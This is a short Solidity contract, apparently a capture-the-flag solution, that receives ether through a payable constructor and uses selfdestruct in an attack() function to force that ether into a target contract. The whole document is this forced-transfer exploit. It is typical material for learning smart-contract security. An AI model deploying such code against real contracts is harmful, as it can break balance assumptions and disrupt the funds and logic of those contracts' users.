
pragma solidity ^0.8.0;

contract AttackForce{

    constructor () payable {

    }

    function attack(address payable target) public {
        selfdestruct(target);
    }
}
